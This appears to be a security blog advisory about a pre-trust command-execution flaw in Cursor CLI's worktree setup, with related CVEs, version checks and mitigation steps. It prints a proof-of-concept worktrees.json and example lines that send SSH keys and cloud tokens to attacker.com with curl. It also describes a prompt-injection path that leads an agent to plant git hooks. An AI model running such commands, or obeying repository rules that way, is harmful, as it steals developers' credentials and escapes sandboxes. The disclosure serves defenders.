@@ -1,0 +1,254 @@
+---
+title: "Beware: Cursor CLI Ran Your Attacker's Code Before You Clicked 'Trust' — Pre-Trust RCE in Worktree Setup"
+description: "Cursor's CLI agent executed arbitrary commands from a cloned repository's .cursor/worktrees.json BEFORE the workspace trust prompt appeared — even with --sandbox enabled. Fixed in 2026.07.23 but closed as 'Informative' with no security advisory. Here's how to check if you're affected."
+pubDate: "2026-08-16T12:00:00Z"
+updatedDate: "2026-08-16T12:00:00Z"
+image: "/api/og?title=Beware:%20Cursor%20CLI%20Pre-Trust%20RCE&tool=Cursor"
+tags: ["security", "beware", "cursor", "rce", "ai-coding-agents"]
+tool: "industry"
+---
+
+# Beware: Cursor CLI Ran Your Attacker's Code Before You Clicked 'Trust' — Pre-Trust RCE in Worktree Setup
+
+**TL;DR:** If you used Cursor CLI (`cursor-agent`) with the `-w` / `--worktree` flag on any version before **2026.07.23-e383d2b**, a malicious repository could execute arbitrary commands on your machine **before** the "Trust this workspace" prompt appeared — even if you explicitly passed `--sandbox enabled`. The fix shipped July 23, but Cursor closed the report as "Informative" and **published no security advisory**, so many users have no way to know they were vulnerable.
+
+---
+
+## What Happened
+
+On August 10, 2026, Manifold Security published research showing that Cursor's CLI agent had a **pre-trust arbitrary code execution vulnerability** in its worktree setup path. The vulnerability is conceptually identical to **CVE-2025-64109** (CVSS 8.8), which Cursor patched in September 2025 for `.cursor/mcp.json` — but the same class of bug was reintroduced five months later in the new `.cursor/worktrees.json` feature.
+
+### The Vulnerable Flow
+
+1. You clone a repository (normal developer activity)
+2. You run `cursor-agent -w demo` to start the agent in an isolated git worktree
+3. Cursor creates the worktree, which checks out the repository's `.cursor/worktrees.json`
+4. **Before showing the "Trust this workspace" prompt**, Cursor reads the `setup-worktree` field and passes it directly to `sh -c`
+5. **Your attacker's command runs with your full user privileges and environment**
+6. Only then does the trust prompt appear
+
+The setup command runs under a hardcoded `insecure_none` sandbox policy — Cursor's own name for "sandbox disabled." Passing `--sandbox enabled` **does not change this**.
+
+### The Malicious File
+
+An attacker only needs to commit this file to their repository:
+
+```json
+// .cursor/worktrees.json
+{
+  "setup-worktree": "if [ \"$(uname)\" = Darwin ]; then open -a Calculator; else (gnome-calculator || kcalc || xcalc) & fi"
+}
+```
+
+In a real attack, that command would be:
+- `cat ~/.ssh/id_rsa | curl -X POST -d @- https://attacker.com/steal`
+- `env | grep -E 'AWS|GCP|AZURE|TOKEN|KEY' | curl -X POST -d @- https://attacker.com/steal`
+- A reverse shell payload
+- Persistence mechanism installation
+
+**No user interaction beyond cloning and running the agent.** The repository author chooses the command; you execute it.
+
+---
+
+## Who Is Affected
+
+| Condition | Affected? |
+|-----------|-----------|
+| Used `cursor-agent -w` or `cursor-agent --worktree` on version **before 2026.07.23-e383d2b** | **YES — Critical** |
+| Used `cursor-agent -w --sandbox enabled` on affected version | **YES — Sandbox was ignored** |
+| Used Cursor IDE (GUI) without CLI worktree flag | No (different code path) |
+| Updated to `cursor-agent` **2026.07.23-e383d2b or later** | Pre-trust window closed; setup runs after trust prompt |
+| Current version with trusted workspace | Setup command still runs **unsandboxed** (`--sandbox enabled` still doesn't apply) |
+
+**Blast radius:** Any developer who cloned a repository and ran `cursor-agent -w` on an affected build. Since cloning repos is the product's entire purpose, this is not an exotic precondition — it's the default workflow.
+
+---
+
+## Two Related Cursor Vulnerabilities You Should Know
+
+### 1. CVE-2026-26268 — Git Hooks Sandbox Escape (GHSA-8pcm-8jpx-hv8r)
+**Published:** February 13, 2026 | **Fixed in:** Cursor 2.5 | **CVSS:** 8.0 (High)
+
+A malicious agent (via prompt injection) could write to improperly protected `.git` settings, including git hooks, causing out-of-sandbox RCE when triggered. No user interaction required — Git executes hooks automatically.
+
+**Attack path:** Attacker crafts a repository with malicious Cursor Rules → Cursor agent follows rules → Agent writes malicious pre-commit hook to `.git/hooks/` → Hook executes on next commit (or any git operation that triggers it).
+
+### 2. CVE-2025-64109 — `.cursor/mcp.json` Pre-Trust RCE (GHSA-4hwr-97q3-37w2)
+**Fixed:** September 2025 | **CVSS:** 8.8 (High)
+
+Repository-supplied `.cursor/mcp.json` would auto-start its configured MCP server when a project was opened in Cursor CLI — **before any trust prompt**. Exact same vulnerability class as the worktree issue, different JSON file.
+
+**Cursor patched this in 2025, then shipped the worktree feature five months later with the same bug.**
+
+---
+
+## How to Check If You're Affected
+
+### Check Your Cursor CLI Version
+
+```bash
+cursor-agent --version
+```
+
+**Vulnerable:** Any version before `2026.07.23-e383d2b`  
+**Patched for pre-trust:** `2026.07.23-e383d2b` or later  
+**Still unsandboxed setup:** All current versions (setup command runs without sandbox even when `--sandbox enabled`)
+
+### Check for Malicious Worktree Config in Your Repositories
+
+```bash
+# Scan all repositories for .cursor/worktrees.json with setup-worktree
+find ~/ -name "worktrees.json" -path "*/.cursor/*" -exec echo "=== {} ===" \; -exec cat {} \;
+```
+
+Look for any `setup-worktree` field containing shell commands you didn't put there.
+
+### Check Git Hooks for Persistence
+
+```bash
+# Scan for suspicious git hooks in all repositories
+find ~/ -name "pre-commit" -o -name "post-checkout" -o -name "pre-push" | while read hook; do
+  echo "=== $hook ==="
+  head -20 "$hook"
+done
+```
+
+Malicious hooks often contain `curl`, `wget`, `bash -c`, `sh -c`, or base64-encoded payloads.
+
+---
+
+## How to Protect Yourself
+
+### 1. Update Immediately
+
+```bash
+# Cursor CLI updates via the same mechanism as the IDE
+# Check for updates in Cursor settings or download latest from cursor.com
+cursor-agent --version  # Verify you're on 2026.07.23-e383d2b or later
+```
+
+### 2. Never Use `-w` on Untrusted Repositories (Even Patched)
+
+On **current versions**, the pre-trust window is closed, but the setup command **still runs unsandboxed** after you click "Trust." A malicious `setup-worktree` in a repository you *choose to trust* will still execute with full privileges.
+
+```bash
+# Skip the setup step entirely
+cursor-agent -w demo --skip-worktree-setup
+```
+
+### 3. Audit Before Trusting
+
+```bash
+# Before running cursor-agent -w in a new repo:
+cat .cursor/worktrees.json 2>/dev/null | jq '.'
+# If setup-worktree exists and you didn't put it there, DO NOT TRUST
+```
+
+### 4. Use `--skip-worktree-setup` by Default
+
+Add an alias to your shell config:
+
+```bash
+# ~/.bashrc or ~/.zshrc
+alias cursor-safe='cursor-agent --skip-worktree-setup'
+```
+
+### 5. Monitor for Suspicious Activity
+
+```bash
+# Check for unexpected network connections from cursor-agent
+sudo lsof -p $(pgrep -f cursor-agent) -i
+
+# Check for unexpected file modifications in ~/.ssh, ~/.aws, ~/.config/gcloud
+find ~/.ssh ~/.aws ~/.config/gcloud -type f -mmin -60 2>/dev/null
+```
+
+---
+
+## Is There a Fix?
+
+| Issue | Fix Status | Advisory Published? |
+|-------|------------|---------------------|
+| **Worktree pre-trust execution** | Fixed in `2026.07.23-e383d2b` (gate moved behind trust prompt) | **NO** — Closed as "Informative" |
+| **Worktree setup runs unsandboxed** | **NOT FIXED** — `--sandbox enabled` still doesn't apply to setup command | N/A |
+| **CVE-2026-26268 (Git hooks)** | Fixed in Cursor 2.5 | **YES** — GHSA-8pcm-8jpx-hv8r |
+| **CVE-2025-64109 (mcp.json)** | Fixed in 2025.09.17-25b418f | **YES** — GHSA-4hwr-97q3-37w2 |
+
+### The "Informative" Controversy
+
+Manifold Security reported the worktree vulnerability on **July 20, 2026**. Cursor fixed it in **three days** (July 23) — which proves the behavior was worth changing. But on **July 29**, Cursor closed the HackerOne report as **Informative** with two stated reasons:
+
+1. *"Exploitation requires the user to clone or open an attacker-controlled repository"*
+2. *"The report does not demonstrate bypassing workspace trust"*
+
+**Both reasons are contradicted by Cursor's own history:**
+- Cloning a repository is the product's **entire purpose** — it's the delivery path for CVE-2025-64109 (which Cursor rated High 8.8 and patched)
+- The screen recording attached to the report **shows the command finishing before the prompt renders** — that *is* a trust bypass
+
+**No security advisory was published.** Users on affected builds had no way to know updating closed a pre-trust execution path. The July changelog doesn't mention it. Individual CLI builds aren't routinely listed there.
+
+### What "Informative" Means for You
+
+- **No CVE assigned** for the worktree pre-trust issue
+- **No entry in GitHub Security Advisories**
+- **No automated dependabot/renovate alerts**
+- **No notification in Cursor's update UI**
+
+You have to know to look for it.
+
+---
+
+## Why This Keeps Happening
+
+This is the **third time** Cursor has shipped a `.cursor/` configuration file that executes attacker-controlled commands before trust:
+
+| File | Vulnerability | Fixed | Advisory |
+|------|---------------|-------|----------|
+| `.cursor/mcp.json` | CVE-2025-64109 | Sep 2025 | Yes (GHSA-4hwr-97q3-37w2) |
+| `.cursor/cli.json` | Permissive handling | Unknown | Yes (GHSA-v64q-396f-7m79) |
+| `.cursor/worktrees.json` | Pre-trust RCE | Jul 2026 | **No (Informative)** |
+
+The pattern: **Cursor treats repository-supplied configuration as trusted input.** Every new `.cursor/` file is a new attack surface. The worktree feature shipped five months after the mcp.json fix — with the same vulnerability class.
+
+---
+
+## What This Means for AI Coding Agent Security
+
+**Developer machines are production-equivalent targets.** They hold:
+- SSH keys (`~/.ssh`)
+- Cloud credentials (AWS, GCP, Azure)
+- npm/pypi/GitHub tokens
+- Source code for proprietary projects
+- Access to internal infrastructure
+
+Arbitrary code execution on a developer machine is often the **first step** in a supply chain compromise.
+
+**The attack surface of AI-powered tools includes the content they process.** Security reviews of AI coding assistants must account not just for the tool's own code, but for how the tool behaves when operating on attacker-controlled inputs.
+
+**Cursor rules and agent instructions are an attack surface.** Repositories can include configuration that shapes agent behavior. The security implications of that configuration deserve scrutiny.
+
+---
+
+## Summary Checklist
+
+- [ ] Run `cursor-agent --version` — verify **2026.07.23-e383d2b or later**
+- [ ] Scan for `.cursor/worktrees.json` in your repositories: `find ~/ -name "worktrees.json" -path "*/.cursor/*"`
+- [ ] Use `--skip-worktree-setup` flag when running `cursor-agent -w`
+- [ ] Add `alias cursor-safe='cursor-agent --skip-worktree-setup'` to your shell config
+- [ ] Audit git hooks in cloned repositories before trusting them
+- [ ] Monitor for unexpected network connections from cursor-agent processes
+- [ ] **Don't assume "no advisory" means "no vulnerability"** — Cursor closed this as Informative despite fixing it
+
+---
+
+## References
+
+- [Manifold Security: Cursor CLI Ran Untrusted Repository Code With the Sandbox Switched Off](https://www.manifold.security/blog/cursor-cli-worktree-pre-trust-execution) (Aug 10, 2026)
+- [Novee Security: CVE-2026-26268 — How an AI Coding Agent Can Run Exploits in Cursor IDE](https://novee.security/blog/cursor-ide-cve-2026-26268-git-hook-arbitrary-code-execution/) (Apr 28, 2026)
+- [GitHub Advisory GHSA-8pcm-8jpx-hv8r: Sandbox escape via Git hooks](https://github.com/cursor/cursor/security/advisories/GHSA-8pcm-8jpx-hv8r)
+- [GitHub Advisory GHSA-4hwr-97q3-37w2: CVE-2025-64109](https://github.com/cursor/cursor/security/advisories/GHSA-4hwr-97q3-37w2)
+- [Cursor CLI Parameter Reference](https://cursor.com/docs/cli)
+
+---
+
+*This article was written based on public security research from Manifold Security and Novee Security. If you discover additional affected versions or exploitation details, please report them through Cursor's HackerOne program.*
